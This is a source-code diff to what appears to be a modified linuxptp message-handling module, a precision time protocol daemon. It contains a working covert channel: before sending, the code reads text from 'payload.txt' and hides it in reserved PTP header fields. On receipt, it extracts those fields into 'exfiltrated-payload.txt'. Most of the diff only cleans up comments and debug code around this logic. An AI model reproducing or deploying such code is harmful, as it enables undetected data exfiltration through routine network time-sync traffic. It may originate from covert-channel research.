@@ -31,9 +31,7 @@
 #define VERSION      0x02
 
 int assume_two_step = 0;
-unsigned int message_counter = 0;
-unsigned int payload_counter = 0;
-size_t pos = 0;
+size_t pos = 0;  // file position holder
 
 /*
  * Head room fits a VLAN Ethernet header, and 'msg' is 64 bit aligned.
@@ -135,43 +133,43 @@ static inline void print_headers_to_file(struct ptp_header *m, char filename[])
 		time(&now);
 		fprintf(fp, "%s\t%s\n", msg_type_string(m->tsmt & 0x0f), ctime(&now));
 
-	// transportSpecific (UInteger8)
+	// transportSpecific (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->tsmt & 0xf0, bin);
 		fprintf(fp, "\t[transportSpecific]\t%.4s\n", bin);
 		free(bin);
 
-	// reserved (UInteger8)
+	// reserved (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->ver & 0xf0, bin);
 		fprintf(fp, "\t[reserved0]\t\t%.4s\n", bin);
 		free(bin);
 
-	// versionPTP (UInteger8)
+	// versionPTP (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin((m->ver & 0x0f)<<4, bin);
 		fprintf(fp, "\t[versionPTP]\t\t%.4s  (%u)\n", bin, m->ver & 0x0f);
 		free(bin);
 
-	// messageLength (UInteger16)
+	// messageLength (unsigned int, 2 bytes)
 		bin = (char*)malloc(16);
 		word_to_bin(m->messageLength, bin);
 		fprintf(fp, "\t[messageLength]\t\t%.16s  (%u)\n", bin, m->messageLength);
 		free(bin);
 	
-	// domainNumber (UInteger8)
+	// domainNumber (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->domainNumber, bin);
 		fprintf(fp, "\t[domainNumber]\t\t%.8s\n", bin);
 		free(bin);
 	
-	// reserved1 (Octet)
+	// reserved1 (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->reserved1, bin);
 		fprintf(fp, "\t[reserved1]\t\t%.8s\n", bin);
 		free(bin);
 	
-	// flagField[] (Octet)
+	// flagField[] (unsigned int array, 1 byte/index)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->flagField[0], bin);
 		fprintf(fp, "\t[flagField1]\t\t%.8s\n", bin);
@@ -181,10 +179,10 @@ static inline void print_headers_to_file(struct ptp_header *m, char filename[])
 		fprintf(fp, "\t[flagField2]\t\t%.8s\n", bin);
 		free(bin);
 	
-	// correction (Integer64)
+	// correction (int, 8 bytes)
 		fprintf(fp, "\t[correction]\t\t%ld\n", m->correction);
 	
-	// reserved2 (UInteger32)
+	// reserved2 (unsigned int, 4 bytes)
 		bin = (char*)malloc(32);
 		dword_to_bin(m->reserved2, bin);
 		fprintf(fp, "\t[reserved2]\t\t%.32s\n", bin);
@@ -204,19 +202,19 @@ static inline void print_headers_to_file(struct ptp_header *m, char filename[])
 		fprintf(fp, "\t[sourcePortIdentity.portNumber]\t%.16s\n", bin);
 		free(bin);
 	
-	// sequenceId (UInteger16)
+	// sequenceId (unsigned int, 2 bytes)
 		bin = (char*)malloc(16);
 		word_to_bin(m->sequenceId, bin);
 		fprintf(fp, "\t[sequenceId]\t\t%.16s  (%u)\n", bin, m->sequenceId);
 		free(bin);
 	
-	// control (UInteger8)
+	// control (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->control, bin);
 		fprintf(fp, "\t[control]\t\t%.8s\n", bin);
 		free(bin);
 	
-	// logMessageInterval (Integer8)
+	// logMessageInterval (int, 1 byte)
 		fprintf(fp, "\t[logMessageInterval]\t%d\n", m->logMessageInterval);
 	
 	// close file
@@ -247,37 +245,13 @@ static inline void print_message_to_file(struct ptp_message *m, char filename[])
 			sec = (unsigned long) m->sync.originTimestamp.seconds_lsb & 0xFFFFFFFF;
 			sec = sec | (((unsigned long) m->sync.originTimestamp.seconds_msb & 0xFFFF) << 32);
 			fprintf(fp, "\t[originTimestamp]\t%lu.%u seconds\n", sec, m->sync.originTimestamp.nanoseconds);
-				// bin = (char*)malloc(16);
-				// word_to_bin(m->sync.originTimestamp.seconds_msb, bin);
-				// fprintf(fp, "\t[originTimestamp]\t%.16s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->sync.originTimestamp.seconds_lsb, bin);
-				// fprintf(fp, "%.32s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->sync.originTimestamp.nanoseconds, bin);
-				// fprintf(fp, ".%.32s\n", bin);
-				// free(bin);
 			break;
 		case DELAY_REQ:
 			// originTimestamp
 			sec = (unsigned long) m->delay_req.originTimestamp.seconds_lsb & 0xFFFFFFFF;
 			sec = sec | (((unsigned long) m->delay_req.originTimestamp.seconds_msb & 0xFFFF) << 32);
 			fprintf(fp, "\t[originTimestamp]\t%lu.%u seconds\n", sec, m->delay_req.originTimestamp.nanoseconds);
-				// bin = (char*)malloc(16);
-				// word_to_bin(m->delay_req.originTimestamp.seconds_msb, bin);
-				// fprintf(fp, "\t[originTimestamp]\t%.16s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->delay_req.originTimestamp.seconds_lsb, bin);
-				// fprintf(fp, "%.32s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->delay_req.originTimestamp.nanoseconds, bin);
-				// fprintf(fp, ".%.32s\n", bin);
-				// free(bin);
-				// suffix
+			// suffix
 			bin = (char*)malloc(8);
 			byte_to_bin(m->delay_req.suffix[0], bin);
 			fprintf(fp, "\t[suffix]\t\t%.8s\n", bin);
@@ -288,18 +262,6 @@ static inline void print_message_to_file(struct ptp_message *m, char filename[])
 			sec = (unsigned long) m->pdelay_req.originTimestamp.seconds_lsb & 0xFFFFFFFF;
 			sec = sec | (((unsigned long) m->pdelay_req.originTimestamp.seconds_msb & 0xFFFF) << 32);
 			fprintf(fp, "\t[originTimestamp]\t%lu.%u seconds\n", sec, m->pdelay_req.originTimestamp.nanoseconds);
-				// bin = (char*)malloc(16);
-				// word_to_bin(m->pdelay_req.originTimestamp.seconds_msb, bin);
-				// fprintf(fp, "\t[originTimestamp]\t%.16s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->pdelay_req.originTimestamp.seconds_lsb, bin);
-				// fprintf(fp, "%.32s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->pdelay_req.originTimestamp.nanoseconds, bin);
-				// fprintf(fp, ".%.32s\n", bin);
-				// free(bin);
 			// reserved
 			fprintf(fp, "\t[reserved.clockIdentity]\t");
 			for (int i=0; i<=7; i++) {
@@ -320,18 +282,6 @@ static inline void print_message_to_file(struct ptp_message *m, char filename[])
 			sec = (unsigned long) m->pdelay_resp.requestReceiptTimestamp.seconds_lsb & 0xFFFFFFFF;
 			sec = sec | (((unsigned long) m->pdelay_resp.requestReceiptTimestamp.seconds_msb & 0xFFFF) << 32);
 			fprintf(fp, "\t[requestReceiptTimestamp]\t%lu.%u seconds\n", sec, m->pdelay_resp.requestReceiptTimestamp.nanoseconds);
-				// bin = (char*)malloc(16);
-				// word_to_bin(m->pdelay_resp.requestReceiptTimestamp.seconds_msb, bin);
-				// fprintf(fp, "\t[requestReceiptTimestamp]\t%.16s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->pdelay_resp.requestReceiptTimestamp.seconds_lsb, bin);
-				// fprintf(fp, "%.32s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->pdelay_resp.requestReceiptTimestamp.nanoseconds, bin);
-				// fprintf(fp, ".%.32s\n", bin);
-				// free(bin);
 			// requestingPortIdentity
 			fprintf(fp, "\t[requestingPortIdentity.clockIdentity]\t");
 			for (int i=0; i<=7; i++) {
@@ -351,18 +301,6 @@ static inline void print_message_to_file(struct ptp_message *m, char filename[])
 			sec = (unsigned long) m->follow_up.preciseOriginTimestamp.seconds_lsb & 0xFFFFFFFF;
 			sec = sec | (((unsigned long) m->follow_up.preciseOriginTimestamp.seconds_msb & 0xFFFF) << 32);
 			fprintf(fp, "\t[preciseOriginTimestamp]\t%lu.%u seconds\n", sec, m->follow_up.preciseOriginTimestamp.nanoseconds);
-				// bin = (char*)malloc(16);
-				// word_to_bin(m->follow_up.preciseOriginTimestamp.seconds_msb, bin);
-				// fprintf(fp, "\t[preciseOriginTimestamp]\t%.16s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->follow_up.preciseOriginTimestamp.seconds_lsb, bin);
-				// fprintf(fp, "%.32s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->follow_up.preciseOriginTimestamp.nanoseconds, bin);
-				// fprintf(fp, ".%.32s\n", bin);
-				// free(bin);
 			// suffix
 			bin = (char*)malloc(8);
 			byte_to_bin(m->follow_up.suffix[0], bin);
@@ -374,18 +312,6 @@ static inline void print_message_to_file(struct ptp_message *m, char filename[])
 			sec = (unsigned long) m->delay_resp.receiveTimestamp.seconds_lsb & 0xFFFFFFFF;
 			sec = sec | (((unsigned long) m->delay_resp.receiveTimestamp.seconds_msb & 0xFFFF) << 32);
 			fprintf(fp, "\t[receiveTimestamp]\t%lu.%u seconds\n", sec, m->delay_resp.receiveTimestamp.nanoseconds);
-				// bin = (char*)malloc(16);
-				// word_to_bin(m->delay_resp.receiveTimestamp.seconds_msb, bin);
-				// fprintf(fp, "\t[receiveTimestamp]\t%.16s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->delay_resp.receiveTimestamp.seconds_lsb, bin);
-				// fprintf(fp, "%.32s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->delay_resp.receiveTimestamp.nanoseconds, bin);
-				// fprintf(fp, ".%.32s\n", bin);
-				// free(bin);
 			// requestingPortIdentity
 			fprintf(fp, "\t[requestingPortIdentity.clockIdentity]\t");
 			for (int i=0; i<=7; i++) {
@@ -410,18 +336,6 @@ static inline void print_message_to_file(struct ptp_message *m, char filename[])
 			sec = (unsigned long) m->pdelay_resp_fup.responseOriginTimestamp.seconds_lsb & 0xFFFFFFFF;
 			sec = sec | (((unsigned long) m->pdelay_resp_fup.responseOriginTimestamp.seconds_msb & 0xFFFF) << 32);
 			fprintf(fp, "\t[responseOriginTimestamp]\t%lu.%u seconds\n", sec, m->pdelay_resp_fup.responseOriginTimestamp.nanoseconds);
-				// bin = (char*)malloc(16);
-				// word_to_bin(m->pdelay_resp_fup.responseOriginTimestamp.seconds_msb, bin);
-				// fprintf(fp, "\t[responseOriginTimestamp]\t%.16s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->pdelay_resp_fup.responseOriginTimestamp.seconds_lsb, bin);
-				// fprintf(fp, "%.32s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->pdelay_resp_fup.responseOriginTimestamp.nanoseconds, bin);
-				// fprintf(fp, ".%.32s\n", bin);
-				// free(bin);
 			// requestingPortIdentity
 			fprintf(fp, "\t[requestingPortIdentity.clockIdentity]\t");
 			for (int i=0; i<=7; i++) {
@@ -445,18 +359,6 @@ static inline void print_message_to_file(struct ptp_message *m, char filename[])
 			sec = (unsigned long) m->announce.originTimestamp.seconds_lsb & 0xFFFFFFFF;
 			sec = sec | (((unsigned long) m->announce.originTimestamp.seconds_msb & 0xFFFF) << 32);
 			fprintf(fp, "\t[originTimestamp]\t%lu.%u seconds\n", sec, m->announce.originTimestamp.nanoseconds);
-				// bin = (char*)malloc(16);
-				// word_to_bin(m->announce.originTimestamp.seconds_msb, bin);
-				// fprintf(fp, "\t[originTimestamp]\t%.16s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->announce.originTimestamp.seconds_lsb, bin);
-				// fprintf(fp, "%.32s", bin);
-				// free(bin);
-				// bin = (char*)malloc(32);
-				// dword_to_bin(m->announce.originTimestamp.nanoseconds, bin);
-				// fprintf(fp, ".%.32s\n", bin);
-				// free(bin);
 			// currentUtcOffset
 			fprintf(fp, "\t[currentUtcOffset]\t%d\n", m->announce.currentUtcOffset);
 			// reserved
@@ -578,43 +480,43 @@ static inline void print_headers_to_terminal(struct ptp_header *m, char qualifie
 		time(&now);
 		printf("%s\n", ctime(&now));
 
-	// transportSpecific (UInteger8)
+	// transportSpecific (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->tsmt & 0xf0, bin);
 		printf("\t[transportSpecific]\t%.4s\n", bin);
 		free(bin);
 
-	// reserved (UInteger8)
+	// reserved (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->ver & 0xf0, bin);
 		printf("\t[reserved0]\t\t%.4s\n", bin);
 		free(bin);
 
-	//// versionPTP (UInteger8)
+	//// versionPTP (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin((m->ver & 0x0f)<<4, bin);
 		printf("\t[versionPTP]\t\t%.4s  (%u)\n", bin, m->ver & 0x0f);
 		free(bin);
 
-	//// messageLength (UInteger16)
+	//// messageLength (unsigned int, 2 bytes)
 		bin = (char*)malloc(16);
 		word_to_bin(m->messageLength, bin);
 		printf("\t[messageLength]\t\t%.16s  (%u)\n", bin, m->messageLength);
 		free(bin);
 	
-	// domainNumber (UInteger8)
+	// domainNumber (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->domainNumber, bin);
 		printf("\t[domainNumber]\t\t%.8s\n", bin);
 		free(bin);
 	
-	// reserved1 (Octet)
+	// reserved1 (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->reserved1, bin);
 		printf("\t[reserved1]\t\t%.8s\n", bin);
 		free(bin);
 	
-	// flagField[] (Octet)
+	// flagField[] (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->flagField[0], bin);
 		printf("\t[flagField1]\t\t%.8s\n", bin);
@@ -624,57 +526,40 @@ static inline void print_headers_to_terminal(struct ptp_header *m, char qualifie
 		printf("\t[flagField2]\t\t%.8s\n", bin);
 		free(bin);
 	
-	//// correction (Integer64)
+	//// correction (int, 8 bytes)
 		printf("\t[correction]\t\t%ld\n", m->correction);
 	
-	// reserved2 (UInteger32)
+	// reserved2 (unsigned int, 4 bytes)
 		bin = (char*)malloc(32);
 		dword_to_bin(m->reserved2, bin);
 		printf("\t[reserved2]\t\t%.32s\n", bin);
 		free(bin);
 	
-	//// sequenceId (UInteger16)
+	//// sequenceId (unsigned int, 2 bytes)
 		bin = (char*)malloc(16);
 		word_to_bin(m->sequenceId, bin);
 		printf("\t[sequenceId]\t\t%.16s  (%u)\n", bin, m->sequenceId);
 		free(bin);
 	
-	// control (UInteger8)
+	// control (unsigned int, 1 byte)
 		bin = (char*)malloc(8);
 		byte_to_bin(m->control, bin);
 		printf("\t[control]\t\t%.8s\n", bin);
 		free(bin);
 	
-	//// logMessageInterval (Integer8)
+	//// logMessageInterval (int, 1 byte)
 		printf("\t[logMessageInterval]\t%d\n", m->logMessageInterval);
 	
 	// dividing line
 		printf("\n===============================================================\n\n");
 }
 
-// logs message
-static inline void log_message(struct ptp_header *m)
-{
-	// initialization
-		FILE *log;
-		log = fopen("message-log.txt", "a");
-
-	// log message
-		time_t now;
-		time(&now);
-		fprintf(log, "%u\t%s\t%s", message_counter, msg_type_string(m->tsmt & 0x0f), ctime(&now));
-
-	// close file
-		message_counter++;
-		fclose(log);
-}
-
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////// hdr_post_recv
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////// uses ptp_header
 static int hdr_post_recv(struct ptp_header *m)
 {
-
-	// convert byte order
+	// CONVERT BYTE ORDER
+    //// included in original linuxptp source
 		if ((m->ver & VERSION_MASK) != VERSION)
 			return -EPROTO;
 		m->messageLength = ntohs(m->messageLength);  // converts UInteger16 messageLength from network byte order to host CPU byte order
@@ -682,13 +567,13 @@ static int hdr_post_recv(struct ptp_header *m)
 		m->sourcePortIdentity.portNumber = ntohs(m->sourcePortIdentity.portNumber);  // converts UInteger16 sourcePortIdentity.portNumber from network byte order to host CPU byte order
 		m->sequenceId = ntohs(m->sequenceId);  // converts UInteger16 sequenceId from network byte order to host CPU byte order
 	
-	// print header fields to terminal
+	// DEBUG: PRINT HEADER FIELDS TO TERMINAL
 		// print_headers_to_terminal(m, "POST-RECEIVE");
 
-	// print header fields to file
+	// DEBUG: WRITE HEADER FIELDS TO FILE
 		// print_headers_to_file(m, "post-receive.txt");
 	
-	// print payload to file
+	// READ HEADER FIELDS AND WRITE PAYLOAD TO FILE
 		FILE *exfp;
 		exfp = fopen("exfiltrated-payload.txt", "a");
 		fprintf(exfp, "%c", (m->ver & 0xf0) | (m->reserved1 >> 4));
@@ -698,16 +583,10 @@ static int hdr_post_recv(struct ptp_header *m)
 		fprintf(exfp, "%c", (m->reserved2 >> 8) & 0xff);
 		fprintf(exfp, "%c", (m->reserved2) & 0xff);
 		fprintf(exfp, "%c", (m->control) & 0xff);
-		// printf("\n\t%c\t%#x\n", (m->ver & 0xf0) | (m->reserved1 >> 4), (m->ver & 0xf0) | (m->reserved1 >> 4));
-		// printf("\t%c\t%#x\n", ((m->reserved1 & 0x0f) << 4) | (m->flagField[0] >> 4), ((m->reserved1 & 0x0f) << 4) | (m->flagField[0] >> 4));
-		// printf("\t%c\t%#x\n", (m->reserved2 >> 24) & 0xff, (m->reserved2 >> 24) & 0xff);
-		// printf("\t%c\t%#x\n", (m->reserved2 >> 16) & 0xff, (m->reserved2 >> 16) & 0xff);
-		// printf("\t%c\t%#x\n", (m->reserved2 >> 8) & 0xff, (m->reserved2 >> 8) & 0xff);
-		// printf("\t%c\t%#x\n", (m->reserved2) & 0xff, (m->reserved2) & 0xff);
-		// printf("\t%c\t%#x\n", (m->control) & 0xff, (m->control) & 0xff);
 		fclose(exfp);
 
-	// return
+	// RETURN
+    //// included in original linuxptp source
 		return 0;
 }
 
@@ -715,77 +594,57 @@ static int hdr_post_recv(struct ptp_header *m)
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////// uses ptp_header
 static int hdr_pre_send(struct ptp_header *m)
 {
-	// initialization
-		unsigned int payload[14];
-		char *filename = "payload.txt";
-		unsigned int ch;
-		int i, j;
+	// INITIALIZATION
+		char *filename = "payload.txt";  // payload source file
+		unsigned int ch;  // holder for individual chars in payload text
+		unsigned int payload[14];  // holder for numerical encodings of payload chars
+		int i, j;  // iterators
 
-	// open file
+	// OPEN PAYLOAD SOURCE FILE
 		FILE *fp = fopen(filename, "r");
 	
-	// error check
+	// ERROR CHECK
 		if(fp == NULL) {
 			printf("Error: could not open file %s", filename);
 		}
 
-	// returned to saved position
+	// RETURN TO SAVED FILE POSITION
 		fseek(fp, pos, SEEK_SET);
-		// printf("%ld\n", pos);
 
-	// get next values
-		for(i = 0; i<14; i++) {
-			ch = fgetc(fp);
-			// end_of_file = feof(fp);
-			// printf("\n\n\t%ld\t%d", pos, feof(fp));
-			// switch(feof(fp)) {
+	// READ NEXT 7 CHARS OF PAYLOAD
+		for(i = 0; i<14; i++) {  // for 14 repetitions...
+			ch = fgetc(fp);  // get next char in payload text
 			switch(ch == EOF) {
-				case 0:
-					// printf("\t%c ", ch);
-					payload[i] = (unsigned int)(ch >> 4);
-					// printf("(%d-%d)\t%#x ", i, (i+1), payload[i]);
-					i++;
-					payload[i] = (unsigned int)(ch & 0x0f);
-					// printf("%#x\n", payload[i]);
-					break;
-				default:
-					// printf("\n\n\t%#x \n", ch);
-					// payload[i] = (unsigned int)((ch >> 4) & 0xf);
-					// // printf("(%d-%d)\t%#x ", i, (i+1), payload[i]);
-					// i++;
-					// payload[i] = (unsigned int)(ch & 0x0f);
-					// // printf("%#x\n", payload[i]);
-					// i++;
-					for(j=i; j<14; j++) {
-						payload[j] = (unsigned int)(0x0);
-						// printf("\t%#x\n", payload[j]);
-						j++;
-						payload[j] = (unsigned int)(0xa);
-						// printf("\t%#x\n", payload[j]);
+				case 0:  // if current char does not mark the end of the payload file...
+					payload[i] = (unsigned int)(ch >> 4);  // save the first digit of the current char's ASCII value
+					i++;  // move forward one spot in the holder array
+					payload[i] = (unsigned int)(ch & 0x0f);  // save the second digit of the current char's ASCII value
+					break;  // exit switch statement and continue to next char in payload text
+				default:  // if current char does mark the end of the payload file...
+					for(j=i; j<14; j++) {  // for the remainder of the space in the holder array...
+						payload[j] = (unsigned int)(0x0);  // save the first digit of the ASCII value for new line
+						j++;  // move forward one spot in the holder array
+						payload[j] = (unsigned int)(0xa);  // save the second digit of the ASCII value for new line
 					}
-					goto reset_file;
+					goto reset_file;  // reset file position to zero
 			}
 		}
 
-	// save position in file
-		// printf("%ld\n", ftell(fp));
+	// SAVE FILE POSITION
 		pos = ftell(fp);
-		// printf("%ld\n", pos);
+		reset_file_return:
 
-	// close file
+	// CLOSE PAYLOAD SOURCE FILE
 		fclose(fp);
 
-	// modify header values
+	// WRITE PAYLOAD TO HEADER FIELDS
 		// reserved (nibble)
 			m->ver = m->ver | (payload[0]<<4);
-			// printf("\n%lu\t%#x\n", (2*pos), (m->ver >> 4));
-		// reserved1 (byte)
+		// reserved1 (1 byte)
 			m->reserved1 = (payload[1]<<4) | payload[2];
-			// printf("%lu-%lu\t%#x\n", ((2*pos)+1), ((2*pos)+2), (m->reserved1));
-		// flagField[0] (byte)
+		// flagField[0] (nibble)
 			m->flagField[0] = m->flagField[0] | (payload[3]<<4);
-			// printf("%lu\t%#x\n", ((2*pos)+3), (m->flagField[0] >> 4));
-		// reserved2 (dword)
+		// reserved2 (4 bytes)
 			m->reserved2 = (payload[4] << 28) | 
 							(payload[5] << 24) |
 							(payload[6] << 20) |
@@ -794,49 +653,42 @@ static int hdr_pre_send(struct ptp_header *m)
 							(payload[9] << 8) |
 							(payload[10] << 4) |
 							payload[11];
-			// printf("%lu-%lu\t%#x\n", ((2*pos)+4), ((2*pos)+11), (m->reserved2));
-		// control (byte)
+		// control (1 byte)
 			m->control = (payload[12] << 4) | payload[13];
-			// printf("%lu-%lu\t%#x\n", ((2*pos)+12), ((2*pos)+13), (m->control));
 
-	// print header fields to terminal
+	// DEBUG: PRINT HEADER FIELDS TO TERMINAL
 		// print_headers_to_terminal(m, "PRE-SEND");
 
-	// print header fields to file
+	// DEBUG: WRITE HEADER FIELDS TO FILE
 		// print_headers_to_file(m, "pre-send.txt");
 
-	// print payload to file
-		FILE *psfp;
-		psfp = fopen("pre-send-payload.txt", "a");
-		fprintf(psfp, "%c", (m->ver & 0xf0) | (m->reserved1 >> 4));
-		fprintf(psfp, "%c", ((m->reserved1 & 0x0f) << 4) | (m->flagField[0] >> 4));
-		fprintf(psfp, "%c", (m->reserved2 >> 24) & 0xff);
-		fprintf(psfp, "%c", (m->reserved2 >> 16) & 0xff);
-		fprintf(psfp, "%c", (m->reserved2 >> 8) & 0xff);
-		fprintf(psfp, "%c", (m->reserved2) & 0xff);
-		fprintf(psfp, "%c", (m->control) & 0xff);
-		// printf("\n\t%#x\n", (m->ver & 0xf0) | (m->reserved1 >> 4));
-		// printf("\t%#x\n", ((m->reserved1 & 0x0f) << 4) | (m->flagField[0] >> 4));
-		// printf("\t%#x\n", (m->reserved2 >> 24) & 0xff);
-		// printf("\t%#x\n", (m->reserved2 >> 16) & 0xff);
-		// printf("\t%#x\n", (m->reserved2 >> 8) & 0xff);
-		// printf("\t%#x\n", (m->reserved2) & 0xff);
-		// printf("\t%#x\n", (m->control) & 0xff);
-		fclose(psfp);
+	// DEBUG: READ HEADER FIELDS AND WRITE PAYLOAD TO FILE
+		// FILE *psfp;
+		// psfp = fopen("pre-send-payload.txt", "a");
+		// fprintf(psfp, "%c", (m->ver & 0xf0) | (m->reserved1 >> 4));
+		// fprintf(psfp, "%c", ((m->reserved1 & 0x0f) << 4) | (m->flagField[0] >> 4));
+		// fprintf(psfp, "%c", (m->reserved2 >> 24) & 0xff);
+		// fprintf(psfp, "%c", (m->reserved2 >> 16) & 0xff);
+		// fprintf(psfp, "%c", (m->reserved2 >> 8) & 0xff);
+		// fprintf(psfp, "%c", (m->reserved2) & 0xff);
+		// fprintf(psfp, "%c", (m->control) & 0xff);
+		// fclose(psfp);
 
-	// convert byte order
-	m->messageLength = htons(m->messageLength);  // converts UInteger16 messageLength from host CPU byte order to network byte order
-	m->correction = host2net64(m->correction);  // converts Integer64 correction from host CPU byte order to big endian byte order
-	m->sourcePortIdentity.portNumber = htons(m->sourcePortIdentity.portNumber);  // converts UInteger16 sourcePortIdentity.portNumber from host CPU byte order to network byte order
-	m->sequenceId = htons(m->sequenceId);  // converts UInteger16 sequenceId from from host CPU byte order to network byte order	
+	// CONVERT BYTE ORDER
+    //// included in original linuxptp source
+	m->messageLength = htons(m->messageLength);  // converts unsigned int messageLength from host CPU byte order to network byte order
+	m->correction = host2net64(m->correction);  // converts int correction from host CPU byte order to network byte order
+	m->sourcePortIdentity.portNumber = htons(m->sourcePortIdentity.portNumber);  // converts unsigned int sourcePortIdentity.portNumber from host CPU byte order to network byte order
+	m->sequenceId = htons(m->sequenceId);  // converts unsigned int sequenceId from from host CPU byte order to network byte order	
 
-	// return
+	// RETURN
+    //// included in original linuxptp source
 		return 0;
 
-	// reset file
+	// RESET FILE
 		reset_file:
-			pos=0;
-			return 0;
+			pos=0;  // set file position to zero
+			goto reset_file_return;  // complete the rest of the function
 
 }
 
